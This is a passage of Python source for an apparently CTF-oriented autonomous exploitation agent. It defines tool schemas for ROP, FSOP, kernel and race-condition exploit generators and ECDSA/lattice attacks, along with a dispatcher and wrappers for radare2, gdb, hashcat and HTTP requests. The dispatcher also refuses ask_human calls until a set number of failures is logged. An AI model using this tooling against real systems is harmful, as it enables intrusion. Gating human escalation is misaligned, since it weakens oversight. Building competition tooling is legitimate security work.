        "Returns ready-to-paste pwntools code with all gadget addresses filled in."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":     {"type": "string", "description": "Path to the ELF binary"},
            "goal":       {
                "type": "string",
                "enum": ["execve_binsh", "orw_flag", "leak_got", "mprotect_shellcode"],
                "description": "What the ROP chain should accomplish",
            },
            "libc_path":  {"type": "string", "description": "Path to libc.so.6 (required for execve_binsh with libc gadgets)"},
            "offset":     {"type": "integer", "description": "Overflow offset to RIP (from cyclic_offset; required)"},
            "leak_addr":  {"type": "string", "description": "Leaked runtime address of a known libc symbol (hex, e.g. '0x7f...d90')"},
            "leak_symbol":{"type": "string", "description": "Which symbol was leaked (e.g. 'puts', 'printf', 'read')"},
            "flag_path":  {"type": "string", "description": "Path to flag file for orw_flag goal (default: /flag)"},
        },
        "required": ["binary", "goal", "offset"],
    },
})

TOOL_SCHEMAS.append({
    "name": "io_file_exploit",
    "description": (
        "Generate an _IO_FILE exploitation script (FSOP) for glibc 2.34+ where __malloc_hook "
        "and __free_hook are removed. Techniques: "
        "fsop_str_overflow (_IO_str_overflow vtable pivot → system call), "
        "house_of_apple2 (_IO_wfile_overflow → wide_vtable arbitrary call), "
        "house_of_emma (_IO_cookie_file with custom read/write funcs). "
        "Returns a pwntools script with fake FILE struct construction and trigger sequence."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "binary":     {"type": "string", "description": "Path to target binary"},
            "technique":  {
                "type": "string",
                "enum": ["fsop_str_overflow", "house_of_apple2", "house_of_emma", "vtable_hijack"],
                "description": "IO_FILE exploitation technique",
            },
            "libc_path":  {"type": "string", "description": "Path to libc.so.6"},
            "heap_addr":  {"type": "string", "description": "Known heap address (hex) for fake FILE placement"},
            "libc_base":  {"type": "string", "description": "Leaked libc base address (hex)"},
        },
        "required": ["binary", "technique"],
    },
})

TOOL_SCHEMAS.append({
    "name": "race_condition_exploit",
    "description": (
        "Exploit a race condition vulnerability. Modes: "
        "toctou_symlink (TOCTOU file-check/use race via symlink swap), "
        "parallel_requests (send N concurrent HTTP requests to win a race window), "
        "userfaultfd_pause (pause kernel mid-copy for precise timing in kernel exploits), "
        "fork_timing (measure fork+exec timing to predict ASLR or PIE base). "
        "Returns exploit script or structured timing attack."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "mode":       {
                "type": "string",
                "enum": ["toctou_symlink", "parallel_requests", "userfaultfd_pause", "fork_timing"],
                "description": "Race condition exploitation mode",
            },
            "target":     {"type": "string", "description": "Target binary path or URL"},
            "race_window": {"type": "integer", "description": "Number of parallel threads/requests (default 20)"},
            "check_path": {"type": "string", "description": "For toctou_symlink: path being checked (e.g. /tmp/safe_file)"},
            "target_path": {"type": "string", "description": "For toctou_symlink: privileged target to swap to (e.g. /etc/passwd)"},
        },
        "required": ["mode", "target"],
    },
})

TOOL_SCHEMAS.append({
    "name": "kernel_exploit",
    "description": (
        "Kernel exploitation toolkit for CTF kernel challenges. "
        "Actions: info (gather kernel info: version, KASLR, SMEP/SMAP/KPTI status), "
        "find_gadgets (search kernel gadgets from /proc/kallsyms), "
        "gen_exploit (generate kernel exploit skeleton: modprobe_path overwrite or commit_creds ROP), "
        "seccomp_check (check seccomp profile of a binary with seccomp-tools). "
        "Requires kernel module (.ko) or running in VM environment."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "action":     {
                "type": "string",
                "enum": ["info", "find_gadgets", "gen_exploit", "seccomp_check"],
                "description": "Kernel exploit action",
            },
            "technique":  {
                "type": "string",
                "enum": ["modprobe_path", "commit_creds_rop", "pipe_buffer_uaf", "msg_msg_spray"],
                "description": "For gen_exploit: which kernel technique to use",
            },
            "binary":     {"type": "string", "description": "For seccomp_check: path to binary"},
            "kallsyms_path": {"type": "string", "description": "Path to kallsyms dump (default: /proc/kallsyms)"},
        },
        "required": ["action"],
    },
})

TOOL_SCHEMAS.append({
    "name": "exploit_crash_analyze",
    "description": (
        "Analyze exploit crash output and return specific, actionable fix recommendations. "
        "Call this immediately when shell_exec returns a crash (SIGSEGV, SIGILL, abort, EOF, "
        "kernel panic, heap assertion, seccomp block). It detects the crash type and provides "
        "the exact fix — do NOT call note_failure before calling this first. "
        "Crash types handled: MOVAPS stack alignment, cyclic pattern in RIP, stack canary, "
        "heap double-free, EOF/padding error, seccomp filter, one_gadget constraint, KPTI panic."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "crash_output": {"type": "string", "description": "Full stderr/stdout from the crashed exploit run"},
            "binary": {"type": "string", "description": "Path to the target binary (optional, for follow-up tool suggestions)"},
            "offset": {"type": "integer", "description": "Current RIP offset used (optional, for context)"},
        },
        "required": ["crash_output"],
    },
})

TOOL_SCHEMAS.append({
    "name": "verify_crypto",
    "description": (
        "Verify a crypto answer by re-encrypting or re-encoding and checking it matches the "
        "challenge ciphertext. Use this BEFORE reporting a flag for any crypto challenge. "
        "Supported checks: xor_base64 (re-XOR and base64-encode), rsa_encrypt (pow(m,e,n)==c), "
        "vigenere_encrypt (re-encrypt plaintext with recovered key), cube_encrypt (m^e==c for small e), "
        "base64_chain (re-encode through the chain), morse_decode (decode Morse to check output)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "mode": {
                "type": "string",
                "enum": ["xor_base64", "rsa_encrypt", "vigenere_encrypt", "cube_encrypt",
                         "base64_chain", "morse_decode"],
                "description": "Verification mode matching the challenge type",
            },
            "plaintext": {"type": "string", "description": "The recovered plaintext / flag candidate"},
            "ciphertext": {"type": "string", "description": "The original ciphertext/encoded value from the challenge"},
            "key": {"type": "string", "description": "Key or parameters (XOR key, Vigenere key, Morse string, etc.)"},
            "params": {
                "type": "object",
                "description": "Extra numeric parameters: e.g. {\"n\": 90581, \"e\": 17993} for RSA",
            },
        },
        "required": ["mode"],
    },
})

TOOL_SCHEMAS.append({
    "name": "ecdsa_nonce_reuse",
    "description": (
        "Recover an ECDSA private key from two signatures that share the same nonce (k). "
        "This is one of the most common ECC CTF attacks. "
        "Given two (r, s) pairs for the same key where r values match (same k used): "
        "k = (h1-h2)/(s1-s2) mod n, then d = (s1*k-h1)/r mod n. "
        "Provide all values as decimal integers or 0x-prefixed hex strings."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "r":  {"type": "string", "description": "Shared r value (same in both signatures)"},
            "s1": {"type": "string", "description": "s value from first signature"},
            "s2": {"type": "string", "description": "s value from second signature"},
            "h1": {"type": "string", "description": "Message hash of first message (hex or decimal)"},
            "h2": {"type": "string", "description": "Message hash of second message (hex or decimal)"},
            "curve_n": {
                "type": "string",
                "description": "Curve group order n. Named curves accepted: secp256k1, secp256r1, secp384r1. Or supply the integer directly.",
            },
        },
        "required": ["r", "s1", "s2", "h1", "h2"],
    },
})

TOOL_SCHEMAS.append({
    "name": "lattice_attack",
    "description": (
        "Run a lattice-based cryptographic attack using SageMath or fpylll. "
        "Supports: (1) Coppersmith small-roots — find small roots of a polynomial mod N; "
        "(2) LLL reduction on a custom matrix — supply the matrix rows; "
        "(3) HNP (Hidden Number Problem) — recover a secret from partial nonce leaks (e.g. MSBs of ECDSA k). "
        "Use this for: RSA low-exponent padding attacks, partial key exposure, biased-nonce ECDSA, SVP/CVP problems. "
        "Requires SageMath ('sage') or fpylll to be installed."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "mode": {
                "type": "string",
                "enum": ["coppersmith", "lll_matrix", "hnp"],
                "description": "Attack mode",
            },
            "polynomial": {
                "type": "string",
                "description": "Coppersmith: polynomial as Sage string e.g. 'x^3 + a*x + b'. Leave empty for lll_matrix/hnp.",
            },
            "modulus": {
                "type": "string",
                "description": "Coppersmith: modulus N as integer string.",
            },
            "beta": {
                "type": "number",
                "description": "Coppersmith: beta parameter (0 < beta <= 1, typically 0.5). Default 0.5.",
            },
            "matrix_rows": {
                "type": "array",
                "items": {"type": "array", "items": {"type": "integer"}},
                "description": "lll_matrix: list of integer row vectors.",
            },
            "hnp_signatures": {
                "type": "array",
                "items": {"type": "object"},
                "description": "hnp: list of {r, s, h, msb_leak, leak_bits} dicts.",
            },
            "curve_n": {
                "type": "string",
                "description": "hnp: curve group order.",
            },
        },
        "required": ["mode"],
    },
})

TOOL_SCHEMAS.append({
    "name": "foundry_run",
    "description": (
        "Blockchain/EVM: interact with smart contracts using Foundry's cast/forge/anvil. "
        "Use for Solidity CTF challenges — call contract functions, send transactions, "
        "deploy exploit contracts, or start a local Anvil fork. "
        "Actions: cast (arbitrary cast command), forge (forge command), "
        "anvil_start (start local node), anvil_stop, call (read-only eth_call), send (state-changing tx)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "action": {
                "type": "string",
                "enum": ["cast", "forge", "anvil_start", "anvil_stop", "call", "send"],
                "description": "Foundry action to perform.",
            },
            "command": {
                "type": "string",
                "description": "For cast/forge actions: the subcommand and args (e.g. 'call 0xABC 'balanceOf(address)' 0xDEF').",
            },
            "rpc_url": {
                "type": "string",
                "description": "RPC endpoint URL. Default: http://127.0.0.1:8545",
            },
            "contract_address": {
                "type": "string",
                "description": "For call/send: target contract address (0x...).",
            },
            "function_sig": {
                "type": "string",
                "description": "For call/send: Solidity function signature e.g. 'solve(uint256)'.",
            },
            "args": {
                "type": "string",
                "description": "For call/send: space-separated arguments to the function.",
            },
            "private_key": {
                "type": "string",
                "description": "For send: private key for signing the transaction.",
            },
            "value": {
                "type": "string",
                "description": "For send: ETH value to send with tx (e.g. '0.1ether').",
            },
            "fork_url": {
                "type": "string",
                "description": "For anvil_start: upstream RPC to fork from (e.g. mainnet/Sepolia).",
            },
        },
        "required": ["action"],
    },
})

TOOL_SCHEMAS.append({
    "name": "android_analyze",
    "description": (
        "Android/APK reverse engineering: decompile APKs, extract manifests, list permissions, "
        "dump DEX strings, and search decompiled Java source. "
        "Actions: decompile (jadx → Java source), manifest (parse AndroidManifest.xml), "
        "permissions (list declared permissions), strings (extract all strings from DEX), "
        "search (grep decompiled source for a pattern)."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "apk_path": {
                "type": "string",
                "description": "Absolute path to the .apk file.",
            },
            "action": {
                "type": "string",
                "enum": ["decompile", "manifest", "permissions", "strings", "search"],
                "description": "Analysis action to perform.",
            },
            "output_dir": {
                "type": "string",
                "description": "Directory for decompiled output. Defaults to <apk_path>_jadx/.",
            },
            "query": {
                "type": "string",
                "description": "For search action: regex pattern to search in decompiled Java source.",
            },
        },
        "required": ["apk_path", "action"],
    },
})

TOOL_SCHEMAS.append({
    "name": "save_skill",
    "description": (
        "Self-Improvement: Save a generalized Python script/function into your persistent skill library. "
        "Use this exclusively when you successfully write a reusable exploit or script (e.g., a perfect AES padding oracle, "
        "an RSA Wiener's Attack script, or a generic web brute forcer) that you want to reuse in future challenges. "
        "Saved skills become available in all future sessions as standard Python imports from the `agent_skills` package."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "name": {
                "type": "string",
                "description": "A clean module name for the skill (e.g., 'rsa_wiener', 'jwt_forge', 'aes_padding'). No `.py` suffix."
            },
            "description": {
                "type": "string",
                "description": "Short docstring explaining what the skill does and what arguments it expects."
            },
            "code": {
                "type": "string",
                "description": "The complete, standalone Python code for the skill. Must be valid self-contained Python."
            }
        },
        "required": ["name", "description", "code"],
    },
})


# ---------------------------------------------------------------------------
# Auto-flag scanner
# ---------------------------------------------------------------------------

import re as _re

_FLAG_RE = _re.compile(
    r'(?<!\w)'                        # not preceded by a word char
    r'[A-Za-z0-9_]{2,15}'            # flag prefix (CTF, FLAG, CRISIS, HTB, …)
    r'\{'
    r'[^}\s]{3,80}'                   # flag body — no spaces or close braces
    r'\}'
)

# Prefixes that are almost certainly not real flags
_FP_PREFIXES = frozenset({
    "BLOCKED", "REJECTED", "error", "memory", "noted", "print",
    "function", "method", "class", "return", "format", "python",
    "import", "result", "type", "dict", "list", "tuple", "set",
    "shell", "tool", "auto", "system", "message", "output",
    "template", "schema", "object", "bytes", "string", "match",
})


def _auto_scan_flag(result: str, session) -> str:
    """
    Scan a tool result for flag-like patterns.
    Annotates the result and stores the best candidate in session memory.
    Called automatically by execute_tool for every tool invocation.
    """
    if not result or len(result) < 6:
        return result
    matches = _FLAG_RE.findall(result)
    if not matches:
        return result
    real = [m for m in matches
            if m.split("{")[0] not in _FP_PREFIXES
            and len(m) >= 8]
    if not real:
        return result
    best = real[0]
    existing = session.working_memory.get("candidate_flag", "") if session else ""
    if best != existing:
        if session:
            session.update_memory("candidate_flag", best)
        return result + f"\n\n[AUTO-FLAG] Possible flag detected: {best}"
    return result


# ---------------------------------------------------------------------------
# Tool executor
# ---------------------------------------------------------------------------

def execute_tool(name: str, args: dict, session=None) -> str:
    """
    Dispatch a tool call, with duplicate-call detection and flag scanning.

    Duplicate detection:
      - Tracks every (tool, args) combo in session._tool_call_counts
      - 2nd call: returns cached result + warning (skips re-execution)
      - 3rd call: returns cached + strong warning
      - 4th+ call: BLOCKED — returns a hard stop message, does not execute
    """
    import json as _json

    # ── Duplicate / loop detection ────────────────────────────────────────────
    if session is not None and hasattr(session, "check_tool_duplicate"):
        # Build a stable key from the args (sorted for determinism)
        try:
            args_key = _json.dumps(args, sort_keys=True, ensure_ascii=False)
        except Exception:
            args_key = str(args)

        dup = session.check_tool_duplicate(name, args_key)
        if dup is not None:
            status, message = dup
            if status == "block":
                # Hard block — do not execute at all
                session.log_tool(name, args, message)
                return message
            else:
                # Warn — return cached result with the warning prepended
                # Do NOT re-execute (no new information would come out)
                session.log_tool(name, args, message)
                return message

    # ── Execute ───────────────────────────────────────────────────────────────
    result = _dispatch(name, args, session)

    # ── Record for future duplicate checks ───────────────────────────────────
    if session is not None and hasattr(session, "record_tool_call"):
        try:
            args_key = _json.dumps(args, sort_keys=True, ensure_ascii=False)
        except Exception:
            args_key = str(args)
        session.record_tool_call(name, args_key, result)

    if session:
        session.log_tool(name, args, result)
        # Scan every result for flag patterns — catches flags the LLM might miss
        result = _auto_scan_flag(result, session)

    return result


def _dispatch(name: str, args: dict, session) -> str:
    if name == "think":
        return _think(args.get("reasoning", ""), session)
    elif name == "save_state":
        if session:
            return session.save_checkpoint(args.get("checkpoint_name", ""))
        return "[save_state] (no session)"
    elif name == "revert_state":
        res = "[revert_state] (no session)"
        if session:
            res = session.restore_checkpoint(args.get("checkpoint_name", ""))
            # Instruct autonomous.py to rollback context, but handled mainly by state injection
        return res
    elif name == "update_memory":
        if session:
            return session.update_memory(args.get("key", ""), args.get("value", ""))
        return "[memory] (no session)"
    elif name == "r2_analyze":
        return _r2_analyze(**args)
    elif name == "z3_solve":
        return _sandboxed_exec(args.get("code", ""), "z3", session)
    elif name == "gmpy2_compute":
        return _sandboxed_exec(args.get("code", ""), "gmpy2", session)
    elif name == "crack_hash":
        return _crack_hash(**args, session=session)
    elif name == "web_request":
        return _web_request(**args)
    elif name == "ffuf_fuzz":
        return _ffuf_fuzz(**args)
    elif name == "search_writeups":
        return _search_writeups(**args)
    elif name == "get_attack_tree":
        return _get_attack_tree(**args)
    elif name == "get_template":
        return _get_template(**args)
    elif name == "exploit_crash_analyze":
        return _exploit_crash_analyze(**args)
    elif name == "verify_crypto":
        return _verify_crypto(**args)
    elif name == "save_skill":
        return _save_skill(args.get("name", ""), args.get("description", ""), args.get("code", ""), session)
    elif name == "note_failure":
        method = args.get("method", "")
        reason = args.get("reason", "")
        # Block false "tool not installed" notes — a common give-up exploit where the
        # agent claims angr/ghidra/pwntools are unavailable to avoid using them.
        # Tools that ARE installed — do not let the agent claim they're unavailable
        _INSTALLED_TOOLS = ("ghidra", "z3", "pwntools", "radare2", "r2", "gdb", "unicorn")
        _UNAVAIL_PHRASES = (
            "not installed", "not available", "not found", "cannot be used",
            "doesn't exist", "is unavailable", "module not", "no module",
        )
        method_lower = method.lower()
        reason_lower = reason.lower()
        if any(t in method_lower for t in _INSTALLED_TOOLS) and any(
            p in reason_lower for p in _UNAVAIL_PHRASES
        ):
            return (
                "[NOTE_FAILURE REJECTED] Do not note tool availability as a failure. "
                "ghidra_analyze, gdb_analyze, gdb_analyze, z3_solve, pwntools, unicorn_emulate are ALL installed. "
                "If the tool returned an error, read the error and fix your parameters. "
                "If it timed out, use a simpler command or smaller function. "
                "Call think() then retry the tool with corrected inputs."
            )
        if session:
            return session.note_failure(method, reason)
        return f"[noted] {method} — {reason}"
    elif name == "shell_exec":
        cmd = args.get("command", "")
        # Block placeholder echo spin-loops.
        # Specific known patterns:
        _SPIN_PATTERNS = (
            "echo 'tool call",
            'echo "tool call',
            "echo 'complying with",
            "echo 'process tool call",
            "echo 'still cannot",
            "echo 'still no network",
            "echo 'host still unreachable",
            "echo 'target remains unreachable",
            "echo 'tool placeholder",
            "echo 'offline environment",
        )
        if any(p in cmd.lower() for p in _SPIN_PATTERNS):
            return (
                "[SHELL_EXEC BLOCKED] Placeholder echo commands are not allowed. "
                "You are wasting iterations. If the target is unreachable from this environment, "
                "call ask_human('Target unreachable — check VPN/routing') immediately. "
                "Do NOT echo placeholder strings. Take a real action or call ask_human."
            )
        # Block bare echo-only commands (no pipe, redirect, &&, ;) with long filler text.
        # These are always stall/placeholder calls — the agent satisfies "must call a tool"
        # by echoing commentary instead of doing real work.
        _cmd_stripped = cmd.strip()
        _is_bare_echo = (
            _cmd_stripped.lower().startswith("echo ")
            and ">" not in _cmd_stripped
            and "|" not in _cmd_stripped
            and "&&" not in _cmd_stripped
        )
        if _is_bare_echo:
            _echo_arg = _cmd_stripped[5:].strip().strip("'\"")
            # Block placeholder echos:
            # 1. Sentence echos (multiple words, no variable) — always commentary
            # 2. Known single-word filler tokens used to "satisfy" the tool requirement
            _FILLER_WORDS = {"tool", "ok", "ack", "noop", "nop", "continue", "next",
                             "proceed", "done", "noted", "acknowledged", "pass", "skip"}
            _is_filler = (
                (" " in _echo_arg and "$" not in _echo_arg)
                or _echo_arg.lower() in _FILLER_WORDS
            )
            if _is_filler:
                return (
                    "[SHELL_EXEC BLOCKED] Bare echo statements are not real analysis. "
                    "Every iteration must advance the solution. "
                    "Run a real command: r2_analyze, ghidra_analyze, unicorn_emulate, qemu_gdb, "
                    "ltrace_run, or write+execute a Python script. If you are stuck, call think() first."
                )
        return _shell_exec(**args)
    elif name == "bg_shell":
        return _bg_shell(**args)
    elif name == "read_file":
        return _read_file(**args)
    elif name == "write_file":
        return _write_file(**args)
    elif name == "browser_exec":
        return _browser_exec(**args)
    elif name == "decompile_function":
        return _decompile_function(**args)
    elif name == "gdb_analyze":
        return _gdb_analyze(**args)
    elif name == "find_gadget":
        return _find_gadget(**args)
    elif name == "unicorn_emulate":
        return _unicorn_emulate(**args)
    elif name == "qemu_gdb":
        return _qemu_gdb(**args)
    elif name == "angr_solve":
        return _angr_solve(**args, session=session)
    elif name == "allocate_oast_payload":
        return _allocate_oast_payload()
    elif name == "check_oast_logs":
        return _check_oast_logs(**args)
    elif name == "pcap_analyze_flows":
        return _pcap_analyze_flows(**args)
    elif name == "ask_human":
        # Gate: require at least MIN_FAILURES distinct failures before asking the human
        if session and len(session.failed_methods) < MIN_FAILURES_BEFORE_GIVING_UP:
            n = len(session.failed_methods)
            return (
                f"[ASK_HUMAN BLOCKED] You have only recorded {n}/{MIN_FAILURES_BEFORE_GIVING_UP} "
                f"distinct failures. Solve this yourself first. Call think() and try another approach."
            )
        return _ask_human(**args)
    elif name == "delegate_task":
        return _delegate_task(session=session, **args)
    elif name == "run_afl":
        return _run_afl(**args)
    elif name == "nmap_scan":
        return _nmap_scan(**args)
    elif name == "ghidra_analyze":
        return _ghidra_analyze(**args)
    elif name == "one_gadget":
        return _one_gadget(**args)
    elif name == "cyclic_offset":
        return _cyclic_offset(**args)
    elif name == "ltrace_run":
        return _ltrace_run(**args)
    elif name == "crypto_identify":
        return _crypto_identify(**args)
    elif name == "web_search":
        return _web_search(**args)
    elif name == "validate_flag":
        return _validate_flag(**args)
    elif name == "reset_environment":
        return _reset_environment(args, session)
    elif name == "heap_exploit":
        return _heap_exploit(**args, session=session)
    elif name == "rop_chain_synthesis":
        return _rop_chain_synthesis(**args, session=session)
    elif name == "io_file_exploit":
        return _io_file_exploit(**args, session=session)
    elif name == "race_condition_exploit":
        return _race_condition_exploit(**args)
    elif name == "kernel_exploit":
        return _kernel_exploit(**args)
    elif name == "finish":
        return _finish(args, session)
    elif name == "ecdsa_nonce_reuse":
        return _ecdsa_nonce_reuse(**args)
    elif name == "lattice_attack":
        return _lattice_attack(**args)
    elif name == "foundry_run":
        return _foundry_run(**args, session=session)
    elif name == "android_analyze":
        return _android_analyze(**args, session=session)
    elif name == "find_xrefs":
        return _find_xrefs(**args)
    elif name == "get_function_cfg":
        return _get_function_cfg(**args)
    elif name == "gdb_script":
        return _gdb_script(**args)
    else:
        return f"[error] Unknown tool: {name}"


# ---------------------------------------------------------------------------
# Implementations
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# New specialist tool implementations
# ---------------------------------------------------------------------------

def _r2_analyze(binary: str, command: str) -> str:
    """Run radare2 commands on a binary. Automatically runs 'aaa' for disassembly/xref commands."""
    import shlex as _shlex
    # For pdf (disassembly) or axt (xrefs), we need aaa analysis first
    needs_analysis = any(cmd in command for cmd in ["pdf", "axt", " afl", "pdg", "pdc"])
    # Don't prepend 'aaa' if the agent already included it in the command
    already_has_aaa = "aaa" in command.split(";")[0].strip()

    if needs_analysis and not already_has_aaa:
        safe_cmd = f"aaa;{command}"
    else:
        safe_cmd = command

    # Escape only the r2 sub-commands (double-quote content), not the binary path.
    # Use shlex.quote for the binary path so single-quotes in filenames work correctly.
    safe_cmd_escaped = safe_cmd.replace('"', '\\"').replace("'", "'\"'\"'")
    binary_q = _shlex.quote(binary)
    result = _shell_exec(f'r2 -q -e scr.color=0 -c "{safe_cmd_escaped};q" {binary_q} 2>/dev/null', timeout=90)

    if "[error]" in result and "not found" in result.lower():
        return "[error] r2/radare2 not found. Use shell_exec with 'r2 -q -c ...' directly."

    # For empty disassembly, try alternate approach with -A flag
    if needs_analysis and not result.strip():
        result = _shell_exec(f'r2 -A -q -e scr.color=0 -c "{safe_cmd_escaped};q" {binary_q} 2>/dev/null', timeout=90)

    return result


def _find_xrefs(binary: str, symbol: str) -> str:
    """Find all cross-references to a symbol/address using radare2 axt."""
    import shlex as _shlex
    binary_q = _shlex.quote(binary)
    # axt works on addresses; for named symbols try the sym. prefix if bare name given
    sym = symbol if symbol.startswith(("0x", "sym.", "fcn.", "sub.")) else f"sym.{symbol}"
    cmd = f'aaa;axt {sym}'
    cmd_escaped = cmd.replace('"', '\\"')
    result = _shell_exec(f'r2 -q -e scr.color=0 -c "{cmd_escaped};q" {binary_q} 2>/dev/null', timeout=60)
    if not result.strip():
        # Try bare name (works for imports like printf, strcmp)
        cmd2 = f'aaa;axt {symbol}'
        cmd2_escaped = cmd2.replace('"', '\\"')
        result = _shell_exec(f'r2 -q -e scr.color=0 -c "{cmd2_escaped};q" {binary_q} 2>/dev/null', timeout=60)
    if not result.strip():
        return f"[find_xrefs] No cross-references found for '{symbol}'. Try r2_analyze with 'axt {symbol}' after aaa."
    return f"[xrefs to {symbol}]\n{result}"


def _get_function_cfg(binary: str, func_name: str, max_blocks: int = 40) -> str:
    """Return ASCII control-flow graph for a function using radare2 agfd."""
    import shlex as _shlex
    binary_q = _shlex.quote(binary)
    # agft = ASCII graph of function (text); agfd = dotfile; use agft for terminal-readable output
    target = func_name if func_name.startswith(("0x", "sym.", "fcn.", "sub.")) else f"sym.{func_name}"
    # agft @ <func> prints the CFG as ASCII boxes
    cmd = f'aaa;agft @ {target}'
    cmd_escaped = cmd.replace('"', '\\"')
    result = _shell_exec(f'r2 -q -e scr.color=0 -e graph.maxdepth={max_blocks} -c "{cmd_escaped};q" {binary_q} 2>/dev/null', timeout=60)
    if not result.strip():
        # Fallback: try bare name
        cmd2 = f'aaa;agft @ {func_name}'
        cmd2_escaped = cmd2.replace('"', '\\"')
        result = _shell_exec(f'r2 -q -e scr.color=0 -e graph.maxdepth={max_blocks} -c "{cmd2_escaped};q" {binary_q} 2>/dev/null', timeout=60)
    if not result.strip():
        return f"[get_function_cfg] CFG empty for '{func_name}'. Use r2_analyze with 'aaa;agft @ {func_name}' or check the function name with 'afl'."
    # Limit output length so huge CFGs don't blow context
    lines = result.splitlines()
    if len(lines) > 300:
        result = "\n".join(lines[:300]) + f"\n... [{len(lines)-300} lines truncated — use max_blocks to reduce]"
    return f"[CFG: {func_name}]\n{result}"


def _gdb_script(
    binary: str,
    gdb_commands: list,
    stdin_input: str = "",
    args: list = None,
    timeout: int = 30,
) -> str:
    """
    Run a GDB batch session with arbitrary commands.
    Much more powerful than gdb_analyze — supports breakpoints, memory inspection,
    stepping, calling functions, and reading registers at any point.
    """
    import shlex as _shlex
    import tempfile, os, textwrap

    if not gdb_commands:
        return "[error] gdb_script requires at least one gdb_command."

    binary_q = _shlex.quote(binary)
    arg_str = " ".join(_shlex.quote(a) for a in (args or []))

    # Write stdin payload to a temp file if provided
    stdin_file = ""
    if stdin_input:
        with tempfile.NamedTemporaryFile(mode="wb", suffix=".bin", delete=False) as f:
            # Support Python escape sequences in stdin_input
            try:
                payload = bytes(stdin_input, "utf-8").decode("unicode_escape").encode("latin-1")
            except Exception:
                payload = stdin_input.encode("latin-1", errors="replace")
            f.write(payload)
            stdin_file = f.name

    # Build GDB script file
    script_lines = ["set pagination off", "set confirm off"]
    if stdin_file:
        script_lines.append(f"set args {arg_str}")
        # Redirect stdin for `run`
        run_redir = f"< {stdin_file}"
    else:
        script_lines.append(f"set args {arg_str}")
        run_redir = ""

    for cmd in gdb_commands:
        # Inject stdin redirect into `run` commands automatically
        if cmd.strip().lower().startswith("run") and run_redir and run_redir not in cmd:
            script_lines.append(f"{cmd} {run_redir}")
        else:
            script_lines.append(cmd)

    script_lines.append("quit")

    with tempfile.NamedTemporaryFile(mode="w", suffix=".gdb", delete=False) as f:
        f.write("\n".join(script_lines) + "\n")
        script_file = f.name

    try:
        result = _shell_exec(
            f"gdb -q -nw -batch -x {_shlex.quote(script_file)} {binary_q} 2>&1",
            timeout=timeout,
        )
    finally:
        os.unlink(script_file)
        if stdin_file:
            try:
                os.unlink(stdin_file)
            except OSError:
                pass

    if not result.strip():
        return "[gdb_script] No output returned. Check the binary path and GDB commands."
    return result


def _sandboxed_exec(code: str, tool_name: str, session=None) -> str:
    """
    Execute a Python snippet.
    On failure: automatically calls Haiku to fix the script (one retry).
    """
    import time

    if session and hasattr(session, "dir_name"):
        out_dir = Path("temp_" + session.dir_name)
    else:
        out_dir = Path("temp_scripts")

    out_dir.mkdir(parents=True, exist_ok=True)
    ts = int(time.time() * 1000)
    script_path = out_dir / f"{tool_name}_{ts}.py"
    script_path.write_text(code, encoding="utf-8")

    result = _shell_exec(f"python3 '{script_path}'", timeout=60)

    # Auto-fix: if the script failed with a Python traceback, try to fix it once
    if "[SCRIPT FAILED" in result and ("Traceback" in result or "SyntaxError" in result or "Error:" in result):
        fixed = _autofix_script(code, result)
        if fixed and fixed.strip() != code.strip():
            fixed_path = out_dir / f"{tool_name}_{ts}_fixed.py"
            fixed_path.write_text(fixed, encoding="utf-8")
            retry = _shell_exec(f"python3 '{fixed_path}'", timeout=60)
            if "[SCRIPT FAILED" not in retry:
                return f"[auto-fixed by Gemini]\n{retry}"
            # Return both attempts so agent can see what happened
            result = (
                f"{result}\n\n"
                f"[auto-fix attempted — also failed]\n{retry}"
            )

    return result


def _crack_hash(hash_value: str, hash_type: str, wordlist: str = None, session=None) -> str:
    """Crack a hash using hashcat."""
    type_map = {
        "md5": 0, "sha1": 100, "sha256": 1400, "sha512": 1700,
        "bcrypt": 3200, "ntlm": 1000, "lm": 3000, "md5crypt": 500,
    }
    mode = type_map.get(hash_type.lower())
    if mode is None:
        return f"[error] Unknown hash type '{hash_type}'. Supported: {list(type_map)}"

    wl = wordlist or "/usr/share/wordlists/rockyou.txt"
    if not Path(wl).exists():
        # Try compressed version
        compressed = wl + ".gz"
        if Path(compressed).exists():
            _shell_exec(f"gunzip -k {compressed}")
        else:
            return f"[error] Wordlist not found: {wl}"

    import time
    
    if session and hasattr(session, "dir_name"):
        out_dir = Path("temp_" + session.dir_name)
    else:
        out_dir = Path("temp_scripts")
        
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = int(time.time() * 1000)
    hash_file_path = out_dir / f"hash_{ts}.txt"
    hash_file_path.write_text(hash_value.strip(), encoding="utf-8")
    hash_file = str(hash_file_path)

    try:
        result = _shell_exec(
            f"hashcat -m {mode} -a 0 --quiet --potfile-disable "
            f"'{hash_file}' '{wl}' 2>&1 | tail -5",
            timeout=60,
        )
        # Also try to read cracked result
        show = _shell_exec(
            f"hashcat -m {mode} --quiet --potfile-disable --show '{hash_file}' 2>&1",
            timeout=10,
        )
        if show and "[SCRIPT" not in show and "error" not in show.lower():
            return f"[+] Cracked: {show}"
        return result
    finally:
        pass  # We no longer delete the hash file so the user can inspect it


def _web_request(
    url: str,
    method: str = "GET",
    data: dict = None,
    headers: dict = None,
    cookies: dict = None,
    params: dict = None,
) -> str:
    """Make an HTTP request and return status + truncated body."""
    try:
        import requests
        import time
        from pathlib import Path
        
        r = requests.request(
            method.upper(), url,
            data=data, headers=headers, cookies=cookies, params=params,
            timeout=15, allow_redirects=True, verify=False,
        )
        
        # Save full body to file so the agent can grep it
        ts = int(time.time() * 1000)
        dump_path = Path(f"/tmp/webreq_{ts}.txt")
        dump_path.write_text(r.text, encoding="utf-8", errors="replace")

        body = r.text[:4000]
        trimmed = len(r.text) > 4000
        
        flag_hits = []
        import re
        flag_hits = re.findall(
            r'[A-Za-z]{2,10}\{[^}]{3,60}\}', r.text
        )
        
        result = (
            f"[HTTP {r.status_code}] {method} {url}\n"
            f"[!] FULL RESPONSE SAVED TO: {dump_path} ({len(r.text)} bytes)\n"
